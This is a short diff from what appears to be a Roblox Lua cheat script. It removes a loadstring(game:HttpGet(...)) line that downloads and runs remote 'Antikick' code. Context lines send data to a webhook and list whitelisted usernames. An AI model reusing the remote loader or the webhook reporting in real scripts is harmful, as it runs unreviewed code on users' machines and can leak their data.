@@ -72,7 +72,6 @@ local webhookData = createWebhookData()
 
 sendWebhook(webhookUrl, webhookData)
 local player = game.Players.LocalPlayer
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/MyAdmin/refs/heads/main/Antikick"))()
 local playerName = player.Name
 local whitelistedPlayers = {"linkster66", "dgthgcnfhhbsd", "Tnk_Him", "TheRealestOnHere", "328ml", "victorwielki", "AliKhammas", "GYATT_DAMN1", "CanExploiOnMobileLol", "rb0zo", "CokeYTXD", "SheilaBrowning4", "Doritosman2437", "Legalfruad", "rustz7", "6angelzzzz", "bacon_noobyk", "mohii03", "Yasinapel3", "urtcyrcjctyjjtcycrjy", "Shshisnishusgvgsugs", "ichbinabudi1070"}-- Add more whitelisted player usernames as needed
 local function showNotification(message, backgroundColor)
